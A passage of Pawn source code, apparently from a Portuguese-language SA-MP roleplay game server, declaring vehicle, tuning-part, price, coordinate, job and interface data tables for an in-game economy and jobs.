	{534, 1100, 1101, 1106, 1122, 1123, 1124, 1125, 1126, 1127, 1178, 1179, 1180, 1185, 0},    	//Remington
	{535, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 0},    	//Slamvan
	{536, 1103, 1104, 1105, 1107, 1108, 1128, 1181, 1182, 1183, 1184, 0,    0,    0,    0},    	//Blade
	{540, 1004, 1142, 1143, 1144, 1145, 1018, 1019, 1020, 1006, 1024, 1001, 1023, 1007, 1017},  //Vincent
	{542, 1018, 1019, 1020, 1021, 1014, 1015, 1144, 1145, 0,    0,    0,    0,    0,    0},     //Clover
	{546, 1004, 1142, 1143, 1144, 1145, 1018, 1019, 1006, 1024, 1001, 1002, 1023, 1007, 1017},  //Intruder
	{547, 1142, 1143, 1018, 1019, 1020, 1021, 1000, 1003, 1016, 0,    0,    0,    0,    0},     //Primo
	{549, 1011, 1012, 1142, 1143, 1144, 1145, 1018, 1019, 1020, 1001, 1003, 1023, 1007, 1017},  //Tampa
	{550, 1004, 1005, 1142, 1143, 1144, 1145, 1018, 1019, 1020, 1001, 1003, 1023, 1007, 1017},  //Sunrise
	{551, 1005, 1006, 1018, 1019, 1020, 1021, 1002, 1003, 1016, 1023, 0,    0,    0,    0},     //Merit
	{558, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1163, 1164, 1165, 1166, 1167, 1168},  //Uranus
    {559, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1158, 1159, 1160, 1161, 1162, 1173}, 	//Jester
	{560, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1138, 1139, 1140, 1141, 1169, 1170}, 	//Sultan
	{561, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1154, 1155, 1156, 1157}, 	//Stratum
	{562, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1146, 1147, 1148, 1149, 1171, 1172}, 	//Elegy
	{565, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1150, 1151, 1152, 1153}, 	//Flash
    {567, 1102, 1129, 1130, 1131, 1132, 1133, 1186, 1187, 1188, 1189, 0,    0,    0,    0},    	//Savanna
	{575, 1042, 1043, 1044, 1099, 1074, 1075, 1076, 1077, 0,    0,    0,    0,    0,    0},    	//Broadway
	{576, 1134, 1135, 1136, 1137, 1190, 1191, 1192, 1193, 0,    0,    0,    0,    0,    0},    	//Tornado
	{580, 1018, 1020, 1001, 1006, 1023, 1007, 1017, 0,    0,    0,    0,    0,    0,    0},     //Stafford
	{585, 1142, 1143, 1144, 1145, 1018, 1019, 1020, 1013, 1006, 1001, 1003, 1023, 1007, 1017},  //Emperor
	{589, 1004, 1005, 1144, 1145, 1018, 1020, 1013, 1024, 1006, 1000, 1016, 1007, 1017, 0},     //Club
	{600, 1004, 1005, 1018, 1020, 1022, 1006, 1013, 1007, 1017, 0,    0,    0,    0,    0},     //Picador
	{603, 1142, 1143, 1144, 1145, 1018, 1019, 1020, 1013, 1001, 1006, 1023, 1007, 1017, 0}      //Phoenix
};

//Veiculos
enum vehicleInfo
{
	vehModel[64],
	vehValue
}

new Vehicles[212][vehicleInfo] = {
	{"Landstalker",					60000},
	{"Bravura",						40000},
	{"Buffalo",						75000},
	{"Linerunner",					0},
	{"Perenial",					20000},
	{"Sentinel",					40000},
	{"Dumper",						0},
	{"Firetruck",					0},
	{"Trashmaster",					0},
	{"Limousine",					100000},
	{"Manana",						15000},
	{"Infernus",					220000},
	{"Voodoo",						40000},
	{"Pony",						0},
	{"Mule",						0},
	{"Cheetah",						150000},
	{"Ambulance",					0},
	{"Leviathan",					0},
	{"Moonbeam",					0},
	{"Esperanto",					40000},
	{"Taxi",						0},
	{"Washington",					45000},
	{"Bobcat",						25000},
	{"Whoopee",						0},
	{"BF Injection",				30000},
	{"Hunter",						0},
	{"Premier",						50000},
	{"Enforcer",					0},
	{"Securicar",					0},
	{"Banshee",						120000},
	{"Predator",					0},
	{"Bus",							0},
	{"Rhino",						0},
	{"Barracks",					0},
	{"Hotknife",					80000},
	{"Trailer",						0},
	{"Previon",						25000},
	{"Coach",						0},
	{"Taxi",						0},
	{"Stallion",					30000},
	{"Rumpo",						0},
	{"RC Bandit",					800},
	{"Romero",						0},
	{"Packer",						0},
	{"Monster",						0},
	{"Admiral",						50000},
	{"Squallo",						250000},
	{"Seasparrow",					150000},
	{"Pizzaboy",					0},
	{"Tram",						0},
	{"Trailer",						0},
	{"Turismo",						200000},
	{"Speeder",						300000},
	{"Reefer",						50000},
	{"Tropic",						200000},
	{"Flatbed",						0},
	{"Yankee",						0},
	{"Caddy",						0},
	{"Solair",						40000},
	{"Berkley's RC Van",			0},
	{"Skimmer",						300000},
	{"PCJ-600",						25000},
	{"Faggio",						7000},
	{"Freeway",						30000},
	{"RC Baron",					0},
	{"RC Raider",					1000},
	{"Glendale",					0},
	{"Oceanic",						40000},
	{"Sanchez",						20000},
	{"Sparrow",						100000},
	{"Patriot",						0},
	{"Quad",						0},
	{"Coastguard",					0},
	{"Dinghy",						25000},
	{"Hermes",						30000},
	{"Sabre",						30000},
	{"Rustler",						250000},
	{"ZR-350",						160000},
	{"Walton",						0},
	{"Regina",						0},
	{"Comet",						100000},
	{"BMX",							3000},
	{"Burrito",						0},
	{"Camper",						20000},
	{"Marquis",						400000},
	{"Baggage",						0},
	{"Dozer",						0},
	{"Maverick",					450000},
	{"News Chopper",				0},
	{"Rancher",						80000},
	{"FBI Rancher",					0},
	{"Virgo",						0},
	{"Greenwood",					40000},
	{"Jetmax",						400000},
	{"Hotring",						0},
	{"Sandking",					0},
	{"Blista Compact",				40000},
	{"Police Maverick",				0},
	{"Boxville",					0},
	{"Benson",						0},
	{"Mesa",						0},
	{"RC Goblin",					1000},
	{"Hotring Racer A",				0},
	{"Hotring Racer B",				0},
	{"Bloodring Banger",			0},
	{"Rancher",						0},
	{"Super GT",					250000},
	{"Elegant",						40000},
	{"Journey",						0},
	{"Bike",						500},
	{"Mountain Bike",				2000},
	{"Beagle",						200000},
	{"Cropduster",					0},
	{"Stuntplane",					300000},
	{"Tank",						0},
	{"Roadtrain",					70000},
	{"Nebula",						40000},
	{"Majestic",					35000},
	{"Buccaneer",					40000},
	{"Shamal",						500000},
	{"Hydra",						0},
	{"FCR-900",						30000},
	{"NRG-500",						50000},
	{"HPV1000",						0},
	{"Cement Truck",				0},
	{"Reboque",						0},
	{"Fortune",						0},
	{"Cadrona",						0},
	{"FBI Truck",					0},
	{"Willard",						0},
	{"Forklift",					0},
	{"Tractor",						0},
	{"Combine Harvester",			0},
	{"Feltzer",						60000},
	{"Remington",					60000},
	{"Slamvan",						80000},
	{"Blade",						50000},
	{"Freight",						0},
	{"Streak",						0},
	{"Vortex",						0},
	{"Vincent",						45000},
	{"Bullet",						250000},
	{"Clover",						30000},
	{"Sadler",						0},
	{"Firetruck",					0},
	{"Hustler",						0},
	{"Intruder",					45000},
	{"Primo",						40000},
	{"Cargobob",					0},
	{"Tampa",						0},
	{"Sunrise",						80000},
	{"Merit",						100000},
	{"Utility",						0},
	{"Nevada",						0},
	{"Yosemite",					0},
	{"Windsor",						0},
	{"Monster",						0},
	{"Monster",						0},
	{"Uranus",						120000},
	{"Jester",						100000},
	{"Sultan",						120000},
	{"Stratum",						100000},
	{"Elegy",						120000},
	{"Raindance",					0},
	{"RC Tiger",					1500},
	{"Flash",						90000},
	{"Tahoma",						50000},
	{"Savanna",						80000},
	{"Bandito",						0},
	{"Freight Flat",				0},
	{"Streak Carriage",				0},
	{"Kart",						0},
	{"Mower",						0},
	{"Dune",						0},
	{"Sweeper",						0},
	{"Broadway",					0},
	{"Tornado",						0},
	{"AT-400",						0},
	{"DFT-30",						0},
	{"Huntley",						0},
	{"Stafford",					0},
	{"BF-400",						25000},
	{"Newsvan",						0},
	{"Tug",							0},
	{"Trailer",						0},
	{"Emperor",						40000},
	{"Wayfarer",					50000},
	{"Euros",						90000},
	{"Hotdog",						0},
	{"Club",						30000},
	{"Freight Box",					0},
	{"Trailer",						0},
	{"Andromada",					0},
	{"Dodo",						0},
	{"RC Cam",						500},
	{"Launch",						0},
	{"Police Car",					0}, // Los Santos
	{"Police Car",					0}, // San Fierro
	{"Police Car",					0}, // Las Venturas
	{"Police Ranger",				0},
	{"Picador",						0},
	{"SWAT Tank",					0},
	{"Alpha",						90000},
	{"Phoenix",						100000},
	{"Glendale",					0},
	{"Sadler",						0},
	{"Luggage",						0},
	{"Luggage",						0},
	{"Stairs",						0},
	{"Boxville",					0},
	{"Farm Trailer",				0},
	{"Trailer",                     0}
};

new Trailers[] = {
	435, 450, 584, 606, 607, 608, 611
};

new RCs[] = {
	441, 465, 501, 564, 594 // 464 = RC Baron
};

new Bikes[] = {
    448, 461, 462, 463, 468, 481, 521, 522,
    581, 586 // 509 = Bike, 510 = Mountain Bike
};

new Airs[] = {
    417, 425, 447, 460, 469, 476, 487, 488,
	497, 511, 512, 513, 519, 520, 548, 553,
	563, 577, 592, 593,
};

new Boats[] = {
	430, 446, 452, 453, 454, 472, 473, 484,
	493, 595
};

new MaxServerVeh, MaxPlayerVeh;
new VehicleId[MAX_VEHICLES] = {-1, ...};

//Veiculos de historia
new TAXI_HISTORY[2];

//Veiculos de trabalho
new TAXI[14];
new POLICE_CAR[22];
new SCOOTER[19];
new BUS[10];
new TRAIN[1];
new AMBULANCE[16];
new TOWTRUCK[13];
new ROADTRAIN[10];
new FARM[5];
new SMUGGLING[5];
new SECURITY[10];
new STRETCH[12];
new PLANE[11];
new TRAILER[7];
new TRASHMASTER[11];
new NEWS[10];
new ICE_CREAM;
new IML;
new CEMENT;
new POST;
new DRIVING_SCHOOL_CAR[9];
new DRIVING_SCHOOL_BOAT[1];
new DRIVING_SCHOOL_PLANE[1];

//Pizzaboy
new BikePizzas[sizeof SCOOTER] = 0;

//Veiculos a venda
enum osInfo
{
	osModelType,
	Float:osX,
	Float:osY,
	Float:osZ,
	Float:osA,
	osVehId,
	osColours,
	Text3D:osText
}

new VehiclesForSale[][osInfo] = {
	{MODEL_TYPE_CAR,    523.0317, 	-1285.6986, 	16.9693, 	224.3670},
	{MODEL_TYPE_CAR,    527.1592, 	-1283.5313, 	17.0428, 	221.3689},
	{MODEL_TYPE_CAR,    530.2834, 	-1279.9467, 	16.9853, 	218.5538},
	{MODEL_TYPE_CAR,    533.6448, 	-1277.0543, 	16.9467, 	219.8068},
	{MODEL_TYPE_CAR,    537.5171, 	-1273.4572, 	16.9584, 	221.2893},
	{MODEL_TYPE_CAR,    541.0671, 	-1271.2107, 	17.1185, 	222.1353},
	{MODEL_TYPE_CAR,    544.2247, 	-1268.4381, 	16.9711, 	217.3420},
	{MODEL_TYPE_CAR,    549.1544, 	-1265.6058, 	17.0240, 	217.4697},
	{MODEL_TYPE_CAR,    561.9513, 	-1266.1251, 	17.0053, 	104.6485},
	{MODEL_TYPE_CAR,    562.6890, 	-1270.3535, 	16.9219, 	101.4287},
	{MODEL_TYPE_CAR,    564.0649, 	-1275.0378, 	17.0123, 	105.3904},
	{MODEL_TYPE_CAR,    565.0479, 	-1279.5303, 	16.9682, 	104.7820},
	{MODEL_TYPE_CAR,    566.1403, 	-1283.9686, 	16.9651, 	102.4760},
	{MODEL_TYPE_CAR,    552.1501, 	-1290.4183, 	17.0286, 	5.6902},
	{MODEL_TYPE_CAR,    546.5675, 	-1290.3252, 	17.0598, 	1.9372},
	{MODEL_TYPE_CAR,    540.9741, 	-1290.6298, 	17.0048, 	3.3713},
	{MODEL_TYPE_CAR,    535.9780, 	-1291.0809, 	16.9018, 	3.2596},
	{MODEL_TYPE_CAR,    531.1604, 	-1291.6782, 	16.8667, 	6.3699},
	{MODEL_TYPE_CAR,    525.7900, 	-1291.7200, 	16.8673, 	4.6144},
	{MODEL_TYPE_BIKE,   516.3486, 	-1302.4760, 	16.8060, 	100.3939},
	{MODEL_TYPE_BIKE,   516.4780, 	-1298.9739, 	16.9104, 	98.0437},
	{MODEL_TYPE_BIKE,   500.1251, 	-1305.2465, 	16.8389, 	314.5018},
	{MODEL_TYPE_BIKE,   505.1902, 	-1312.2517, 	16.7817, 	326.2239},
	{MODEL_TYPE_BIKE,   507.6706, 	-1295.6622, 	16.7819, 	207.3555},
	{MODEL_TYPE_BIKE,   501.4510, 	-1300.6454, 	16.7823, 	234.5764},
	{MODEL_TYPE_AIR,    1925.8316, 	-2246.6025, 	13.7239, 	185.8982},
    {MODEL_TYPE_AIR,    1886.2187, 	-2285.6101, 	13.7238, 	266.9407},
    {MODEL_TYPE_AIR,    1988.4984, 	-2316.1762, 	13.7237, 	85.4939},
    {MODEL_TYPE_AIR,    1989.0163, 	-2380.4228, 	13.7238, 	93.1894},
    {MODEL_TYPE_BOAT,   740.2649, 	-1499.1752, 	-0.2850, 	170.4482},
    {MODEL_TYPE_BOAT,   718.2175, 	-1494.5605,	 	-0.5207, 	175.1643},
    {MODEL_TYPE_BOAT,   718.9598, 	-1625.6271,	 	-0.3392, 	182.1496},
    {MODEL_TYPE_BOAT,   719.6524, 	-1700.0512, 	-0.2852, 	183.9083},
    {MODEL_TYPE_BOAT,   770.2108, 	-1896.2572, 	-0.3906, 	196.8165},
    {MODEL_TYPE_BOAT,   792.1701, 	-1897.3304, 	-0.4208, 	180.9876},
    {MODEL_TYPE_BOAT,   741.1831, 	-1912.5878, 	-0.1525, 	191.3580}
};

//Auto-Escola
new TestPlayerT;
new TestPartT;
new TestChancesT;
new TestTimerT;
new TestCountT;
new TestPlayerN;
new TestPartN;
new TestPlayerA;
new TestPartA;

//Casas
enum houseInfo
{
	hPickup
}

new Houses[MAX_HOUSES][houseInfo];
new House[MAX_SLOTS] = 0;
new MaxHouse;

enum windowInfo
{
	wndOn,
	Float:wndX,
	Float:wndY,
	Float:wndZ,
	Float:wndLookA,
	Float:wndLookZ,
	wndInt,
	wndVirtualWorld
}

new Window[MAX_SLOTS][windowInfo];

enum hintInfo
{
	hintValue,
	Float:hintX,
	Float:hintY,
	Float:hintZ,
	hintInt
}
				
new HouseInteriors[][hintInfo] = {
	{10000,		243.7243,   	304.9308,		999.1484,		1},
	{15000,		266.5161,   	305.0509,   	999.1484,    	2},
	{20000,		2233.9179,  	-1115.2563,    	1050.8828,    	5},
	{25000,		2218.3828,		-1075.9064,    	1050.4843,   	1},
    {30000,		2282.7851,  	-1140.2812,    	1050.8984,    	11},
	{35000,		223.2462,   	1287.0926,    	1082.1406,    	1},
	{40000,		-42.5199,   	1405.4766,    	1084.4296,    	8},
	{45000,		-68.8037,   	1351.1984,    	1080.2109,    	6},
	{50000,		226.7863,   	1240.0343,    	1082.1406,    	2},
	{55000,		261.2596,    	1284.4267,    	1080.2578,    	4},
    {60000,		260.6613,   	1237.3254,    	1084.2578,    	9},
	{65000,		2807.5625,  	-1174.7185,    	1025.5703,    	8},
    {70000,		2495.8149,  	-1692.0858,		1014.7421,  	3},
	{75000,		295.0417,   	1472.2667,    	1080.2578,    	15},
	{80000,		22.7217,    	1403.3471,    	1084.4370,    	5},
	{85000,     -2170.2619,    	639.3701,    	1052.3750,      1},
	{90000,		2365.4287,  	-1135.5949,    	1050.8825,    	8},
	{95000,		-283.4481,  	1470.9569,    	1084.3750,    	15},
	{100000,	2237.4951,  	-1081.5001,    	1049.0234,    	2},
	{120000,    23.9715,    	1340.3137,    	1084.3750,      10},
	{140000,	2196.8322,  	-1204.3868,    	1049.0234,    	6},
	{160000,	82.9235,		1322.2895,    	1083.8662,    	9},
	{175000,	2576.6560,    	-1300.3663,    	1060.9843,    	2},
	{190000,	226.3100,   	1114.3680,    	1080.9930,    	5},
	{200000,	2317.6428,  	-1026.7320,    	1050.2177,    	9},
	{225000,	234.2822,   	1063.7336,    	1084.2122,    	6},
	{250000,	2324.6508,  	-1149.5426,   	1050.7100,    	12},
	{300000,	140.2712,   	1365.9282,    	1083.8593,    	5},
	{500000,	1260.7875,  	-785.2482,    	1091.9062,    	5}
};

//Cameras de segurança
enum secInfo
{
	secLocal[64],
	Float:secX,
	Float:secY,
	Float:secZ,
	Float:secRX,
	Float:secRY,
	Float:secRZ,
	Float:secZoom,
	secObjectId
}

new SecurityCameras[][secInfo] = {
	{"Boate",			2394.8471,	  -1246.1624,    42.4489,    0.0,    0.0,    242.0},
	{"Bar",				2313.6643, 	  -1672.2135,    31.6654,    0.0,    0.0,    314.0},
	{"Posto",			1951.2120, 	  -1823.8332,    25.1127,    0.0,    0.0,    314.0},
	{"Discoteca",		1810.1494, 	  -1692.9405,    25.9519,    0.0,    0.0,    234.0},
	{"Banco",			1761.9576, 	  -1705.3261,    27.0416,    0.0,    0.0,    310.0},
	{"Delegacia",		1543.9665, 	  -1650.2116,    26.2013,    0.0,    0.0,    128.0},
	{"Ammu-Nation",		1331.9519, 	  -1290.5982,    33.5768,    0.0,    0.0,    234.0},
	{"Pizzaria",		2090.8522,    -1826.5222,    25.2247,    0.0,    0.0,    290.0}
};

new SecCamera[MAX_SLOTS] = 0;

//Vacas
new Cows[9];

//Celular
new Call[MAX_SLOTS] = 0;
new CallCost[MAX_SLOTS] = 0;
new CallTimer[MAX_SLOTS];

//Textdraws
new Text:tdintro[MAX_SLOTS] 		= 		{Text:INVALID_TEXT_DRAW, ...};
new Text:tdchat[MAX_SLOTS]          =       {Text:INVALID_TEXT_DRAW, ...};
new Text:tdspeak[MAX_SLOTS]         =       {Text:INVALID_TEXT_DRAW, ...};
new Text:tdzone[MAX_SLOTS] 			= 		{Text:INVALID_TEXT_DRAW, ...};
new Text:tdhouse[MAX_SLOTS] 		= 		{Text:INVALID_TEXT_DRAW, ...};
new Text:tdspeed[MAX_SLOTS]         =       {Text:INVALID_TEXT_DRAW, ...};
new Text:tdvinfo[MAX_SLOTS] 		= 		{Text:INVALID_TEXT_DRAW, ...};
new Text:tdhealthbar[MAX_SLOTS]   	=       {Text:INVALID_TEXT_DRAW, ...};
new Text:tdgasmeter[100] 			= 		{Text:INVALID_TEXT_DRAW, ...};
new Text:tdgas[2] 					= 		{Text:INVALID_TEXT_DRAW, ...};
new Text:tdclothes[2] 				= 		{Text:INVALID_TEXT_DRAW, ...};
new Text:tdhealth;
new Text:tdblack;
new Text:tdwhite;
new Text:tdred;
new Text:tdgray;
new Text:tdlightgray;
new Text:tdgreen;
new Text:tdjoin;
new Text:tdexit;
new Text:tdphone;
new Text:tdvehicle;
new Text:tdgun;
new Text:tdarrows;

#if SHOW_GAMEMODE_LOGO == true

new Text:tdlogo;

#endif

#if SHOW_WEEKDAY == true

new Text:tdweek;

#endif

//Login
new Login[MAX_SLOTS] = 0;

//Continuar
new ContinueTimer[MAX_SLOTS];

//VoteKick
new VoteKickTimer;
new VoteKickPlayer = -1;
new Votes = 0;
new Voted[MAX_SLOTS] = 0;
new PlayerCount = 0;

//Timers
new PlayerEvent[MAX_SLOTS] = 0;

//Key
new KeyEvent[MAX_SLOTS] = 0;

//Chat Global
new GChat[MAX_SLOTS];

//Brinquedo
new CurrentToy[MAX_SLOTS] = {-1, ...};

//Banco
new Menu:Bank[2];
new BankOpc[MAX_SLOTS] = 0;

//Armas
new Menu:Guns[9];
new Weapon[MAX_SLOTS] = 0;

//Sex Shop
new Menu:Dildos;

//Hotel
new Menu:Hotel;

//Brinquedos
new Menu:Toys;

//Menus (itens)
new Menu:Itens;

//Menus (alimentação)
new Menu:Donuts;
new Menu:Pizzas;
new Menu:Chickens;
new Menu:Burgers;
new Menu:Foods;
new Menu:Drinks;
new Menu:Restaurant;

//Restaurante
new InRestaurant[MAX_SLOTS] = 0;

//Bomba-Remota
new RemoteBomb[MAX_SLOTS] = 0;

//Manco
new Limp[MAX_SLOTS] = 0;

//Morte
new Dying[MAX_SLOTS] = 0;
new DieTimer[MAX_SLOTS];

//Pintura
new PaintVehicle[MAX_SLOTS];
new PaintStage[MAX_SLOTS];
new PaintColours[MAX_SLOTS];

//Retomar
new ResumeTimer[MAX_SLOTS] = 0;

//Introducao
new IntroductionPart[MAX_SLOTS] = 0;

//Coleta
new Collect[MAX_SLOTS] = 0;

new Float:Dumps[][3] = {
	{1919.4543, 	-2088.9211,		13.5816},
	{1920.1440, 	-2123.2827,		13.5848},
	{1175.3402, 	-1878.8687,		13.5765},
	{1093.4054, 	-1881.3174,		13.5469},
	{1102.4594, 	-1876.7643,		13.5469},
	{959.8318, 		-821.7481,		96.4444},
	{974.5941, 		-814.8570,		97.6700},
	{914.9440,		-671.0176,		117.1938},
	{1071.5637,		-777.2383,		107.2760},
	{2545.2141,		-1035.6591,		69.5822},
	{2527.9951,		-1056.7031,		69.5759},
	{2510.4429,		-1030.7483,		70.0345},
	{2426.7161,		-1017.5425,		54.3441},
	{2441.4590,		-1979.9978,		13.5469},
	{2382.4392,		-1940.1761,		13.5469},
	{2176.5598,		-1344.8451,		23.9844},
	{2224.2134,		-1409.4204,		24.0000},
	{1424.1855,		-1319.8253,		13.5547},
	{1420.2666,		-1355.4493,		13.5643},
	{1439.2612,		-1324.7502,		13.5458},
	{1604.3488,		-1060.3590,		23.9063},
	{1630.1682,		-988.8309,		24.0752},
	{1829.5371,		-1113.9519,		23.8766},
	{1786.1411,		-1147.2623,		23.8730},
	{1660.6748,		-1201.4055,		19.7935},
	{1592.9694,		-1201.4099,		19.8162},
	{1425.5841,		-1080.7632,		17.5580},
	{1435.4409,		-1094.6079,		17.5942},
	{1148.7889,		-1386.2189,		13.8293},
	{734.3256,		-1341.2900,		13.5255},
	{1322.0441,		-1236.9178,		13.5469},
	{1461.8387,		-1488.1692,		13.5469},
	{1537.7135,		-1479.5881,		9.5000},
	{1516.4315,		-1849.2903,		13.5469},
	{1420.4170,		-1844.5044,		13.5469},
	{1338.2338,		-1815.8656,		13.5502},
	{1337.4501,		-1773.7675,		13.5469}
};

//Taxista
new Taximeter[MAX_SLOTS] = {-1, ...};
new TaxiDelivery[MAX_SLOTS] = {-1, ...};

new Float:TaxiPlaces[][3] = {
    {367.8906,     -2044.8228,     7.6719},
    {333.1767,     -1349.7882,     14.5078},
    {816.6824,     -1391.5438,     13.4106},
    {1672.8009,    -1164.7067,     23.6563},
    {2718.3965,    -1468.4222,     30.2813},
    {2460.4138,    -2117.0256,     13.5530},
    {2455.0229,    -1318.6008,     23.8359},
    {640.3337,     -499.3890,      16.3359}
};

//Pizzaboy
new PizzaDelivery[MAX_SLOTS] = 0;

new Float:PizzaPlaces[][3] = {
	{2017.8183,    -1629.8990,    13.7120},
	{1122.9456,    -2036.9885,    69.8939},
	{1187.2489,    -1261.0540,    18.8984},
	{1183.2524,    -1077.1636,    31.6718},
	{1142.1408,    -1091.5333,    28.1875},
	{1303.8146,    -982.2668,     38.3526},
	{1259.4984,    -785.4080,     92.0312},
	{2551.0200,    -1233.9851,    49.0013},
	{2492.0534,    -1239.0262,    37.9054},
	{2190.3312,    -1487.5692,    26.1050}
};

//Barman
new Supplies[MAX_SLOTS] = 0;
new DrinkSupply[4];

//Maquinista
enum btInfo
{
	btRef[64],
	Float:btX,
	Float:btY,
	Float:btZ,
	Float:btRX,
	Float:btRY,
	Float:btRZ,
	btRoute,
	btObj
}

new BusTerminals[][btInfo] = {
	{"24/7, Little Mexico", 					1828.3114,    -1849.1767,    13.8781,    0.0,    0.0,    359.4461,		1},
	{"Sub Urban, Jefferson",    				2114.5629,    -1227.8907,    24.2765,    0.0,    0.0,    268.1956,		1},
	{"Banco, East Beach",       				2881.5187,    -1441.5798,    11.2609,    0.0,    0.0,    358.9910,  	1},
	{"Cluckin Bell, East Los Santos",   		2417.5949,    -1517.8797,    24.3087,    0.0,    0.0,    89.8969,   	1},
	{"Aeroporto, Willowfield",          		1978.6591,    -2158.8500,    13.8405,    0.0,    0.0,    89.0706,		1},
	{"Delegacia, Commerce",             		1536.0266,    -1696.0941,    13.8468,    0.0,    0.0,    359.2878,      2},
	{"Noticiario, Vinewood",            		767.5423,     -1388.5512,    13.9266,    0.0,    0.0,    90.9389,       2},
	{"Oficina, Verdant Bluffs",         		1605.3060,    -1879.5229,    13.8390,    0.0,    0.0,    270.2321,      2},
	{"Hospital, Market",                		1212.4743,    -1331.5146,    13.8712,    0.0,    0.0,    359.1693,      2},
	{"Boate, East Los Santos",          		2428.8110,    -1262.7966,    24.3401,    0.0,    0.0,    269.2357,      2},
	{"Ammu Nation, Willowfield",        		2392.1958,    -1965.8531,    13.8468,    0.0,    0.0,    89.5847,       2},
	{"Sex Shop, El Corona",						1954.9782,    -2148.8395,    13.8468,    0.0,    0.0,    179.8519,		3},
	{"Restaurante, East Beach",					2881.2949,    -1468.6917,    11.2676,    0.0,    0.0,    359.8144,		3},
	{"Hospital, Idlewood",						2013.2154,    -1454.1929,    13.8546,    0.0,    0.0,    89.0605,		3},
	{"Oficina, Vinewood",						679.6325,     -1579.2554,    14.4299,    0.0,    0.0,    89.1422,       3},
	{"Banco, Commerce",							1756.1773,    -1682.1323,    13.8444,    0.0,    0.0,    359.5098,      3},
	{"Banco, Market",							1326.3707,    -1388.9132,    13.9201,    0.0,    0.0,    89.2250,		4},
	{"Burger Shot, Marina",						821.4714,     -1621.3280,    13.5468,    0.0,    0.0,    138.0602,		4},
	{"Aeroporto, Los Santos International",		1739.0174,    -2290.0119,    13.8365,    0.0,    0.0,    359.4975,		4},
	{"Virtual Hotel, Santa Maria Beach",		486.5016,     -1668.3088,    22.2521,    349.0,  0.0,    258.8576,		4},
	{"Discoteca, Idlewood",						1828.1302,    -1707.0646,    13.8468,    0.0,    0.0,    359.2511,		4}

};

new Terminal[MAX_SLOTS] = 0;
new TerminalCounter[MAX_SLOTS] = 0;

//Caminhoneiro
new Transport[MAX_SLOTS];
new MetersTraveled[MAX_SLOTS];
new Float:TruckOrigin[MAX_SLOTS][3];

//Jornalista
new Announce[MAX_SLOTS] = 0;
new CameraStyle[MAX_SLOTS] = 0;

//Paramédico
new MedicKit[MAX_SLOTS] = 0;

//Traficante
new Rob[MAX_SLOTS] = 0;
new Cigarrete[MAX_SLOTS] = 0;
new ChopValue;

//Agricultor
new Milk[MAX_SLOTS] = 0;
new Corn[MAX_SLOTS] = 0;
new FarmerTimer[MAX_SLOTS];
new Cowboy[sizeof Cows] = {INVALID_PLAYER_ID, ...};

//Piloto
new AirTransport[MAX_SLOTS];

new Float:Airports[][3] = {
	{1477.4739,		1658.8015,		10.8125},
	{-1653.0762,	-160.4279,		14.1484},
	{2037.3436,		-2593.2714,		13.5468}
};

//Contrabandista
new Smuggling[MAX_SLOTS] = 0;
new SmugglingPart[MAX_SLOTS] = 0;

new Float:SmugglingCarPlaces[][3] = {
	{-2714.5276,	1483.8269,		7.3764},
	{-1746.6765,	202.1463,		3.1335},
	{-2420.3567,	2314.0894,		2.3943},
	{2313.7090,		-2389.8708,		2.7796}
};

new Float:SmugglingWeaponPlaces[][3] = {
    {-2015.3627,	897.3715,		45.4453},
	{-2337.9707,	577.8401,		27.9782},
	{-2656.4023,	202.7016,		4.3359},
	{-2795.4751,	-181.8443,		7.1950}
};

new Float:SmugglingDrugPlaces[][3] = {
	{1368.2190,		1897.0417,		11.4688},
	{1687.5352,		2124.2644,		11.4609},
	{2043.7354,		734.2840,		11.4609},
	{2661.7920,		746.2242,		14.7396}
};

//Segurança
new Pouch[MAX_SLOTS] = 0;

//Motorista Particular
new StretchStatus[sizeof STRETCH] = 0;

//Vendedor de Armas
new WeaponMaterial[MAX_SLOTS] = 0;

//Pescador
new Fishing[MAX_SLOTS] = 0;

enum fishInfo
{
	fishName[32],
	fishPrice
}

new Fishes[][fishInfo] = {
	{"Atum", 		30},
	{"Bagre", 		14},
	{"Barracuda", 	12},
	{"Cavala", 		14},
	{"Dourado", 	18},
	{"Garoupa", 	20},
	{"Namorado", 	12},
	{"Pargo", 		10},
	{"Pescada", 	10},
	{"Robalo", 		24},
	{"Tilápia", 	24},
	{"Truta", 		20},
	{"Salmão", 		32}
};

//Policial
new HoldId[MAX_SLOTS] = {-1, ...};
new CheckArea[MAX_SLOTS] = {INVALID_PLAYER_ID, ...};
new CheckAreaGangZone[MAX_SLOTS];
new WantedPlayers[MAX_SLOTS];
new Ropes[MAX_SLOTS][ROPES];
new RopeCount[MAX_SLOTS];
new RopeHeli[MAX_SLOTS];
new Float:RopeHeliPos[MAX_SLOTS][3];

//Juiz
new TribunalJudge = -1;
new Audience[2];
new Lawyers[2];

//Porte de Armas
new LGunPart[MAX_SLOTS] = 0;

//Veiculos
new VCounter[MAX_SLOTS] = 0;

//Travas
new WorkVehicle[MAX_SLOTS] = 0;

//Atualização
new UpdateTime;

//Cores
new ColourType;
new ColourValue;

//Anti-Cheat
new pUpdate[MAX_SLOTS];
new pMoney[MAX_SLOTS];
new pWeapons[MAX_SLOTS][5];
new pDrunk[MAX_SLOTS];
new Float:pHealth[MAX_SLOTS];
new Float:pArmour[MAX_SLOTS];

//Dança
new DanceStyle[MAX_SLOTS];

//Tempo
new CurrentDay;
new CurrentTime;
new CurrentWeather;

//Invite
new Invite[MAX_SLOTS] = 0;
new InviteSender[MAX_SLOTS] = 0;
new InviteParams[MAX_SLOTS] = 0;

//Portoes
enum gateInfo
{
	gModel,
	gStyle,
	Float:gX,
	Float:gY,
	Float:gZ,
	Float:gRX,
	Float:gRY,
	Float:gRZ,
	
	//Just used in style 1
	Float:gOpenX,
	Float:gOpenY,
	Float:gOpenZ,
	Float:gOpenS,
	//--------------------
	
	gObjectId,
	gParams
}

new Gates[][gateInfo] = {
    {10184, 1,  1597.0823,  -1665.2662,     7.3906,     0.0,    0.0,    270.0610,   1581.4394,   -1665.2662,   7.3906,  5.0},
	{968, 	3,	1544.6845,	-1630.9524,		13.1828, 	0.0, 	270.0, 	270.0000}
